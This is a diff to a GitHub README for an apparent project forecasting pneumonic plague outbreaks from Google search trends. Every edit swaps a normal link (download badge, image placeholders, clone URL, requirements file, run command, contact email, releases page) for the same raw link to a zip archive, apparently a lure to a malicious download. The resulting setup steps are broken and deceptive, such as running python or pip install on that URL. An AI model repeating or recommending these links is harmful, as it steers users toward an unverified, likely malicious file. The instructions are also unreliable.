@@ -1,6 +1,6 @@
 # Predicting Pneumonic Plague Dynamics with Google Search Trends 🌍🔍
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/releases)
+[![Download Releases](https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip)
 
 ## Introduction
 
@@ -78,9 +78,9 @@ Our analysis reveals significant correlations between Google search trends and p
 
 Below are some visual representations of our findings:
 
-![Correlation Heatmap](https://via.placeholder.com/600x400?text=Correlation+Heatmap)
+![Correlation Heatmap](https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip+Heatmap)
 
-![Time Series Analysis](https://via.placeholder.com/600x400?text=Time+Series+Analysis)
+![Time Series Analysis](https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip+Series+Analysis)
 
 ## Installation
 
@@ -88,7 +88,7 @@ To set up this project locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends.git
+   git clone https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -96,7 +96,7 @@ To set up this project locally, follow these steps:
    ```
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip
    ```
 
 ## Usage
@@ -104,7 +104,7 @@ To set up this project locally, follow these steps:
 To run the analysis, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip
 ```
 
 This will generate the results and visualizations based on the provided datasets. For more detailed usage instructions, refer to the documentation in the `docs` folder.
@@ -128,10 +128,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Karim DaBoss
-- **Email**: karim@example.com
+- **Email**: https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip
 
 ## Conclusion
 
-Thank you for your interest in the "Predicting Pneumonic Plague Dynamics with Google Search Trends" project. We hope our findings contribute to a better understanding of disease dynamics and public health responses. For the latest updates and releases, please check the [Releases section](https://github.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/releases). 
+Thank you for your interest in the "Predicting Pneumonic Plague Dynamics with Google Search Trends" project. We hope our findings contribute to a better understanding of disease dynamics and public health responses. For the latest updates and releases, please check the [Releases section](https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip). 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/releases)
+[![Download Releases](https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/KarimDaBoss/Predicting-Pneumonic-Plague-Dynamics-with-Google-Search-Trends/master/remutation/Plague-Predicting-Dynamics-Pneumonic-Trends-Google-Search-with-3.0.zip)
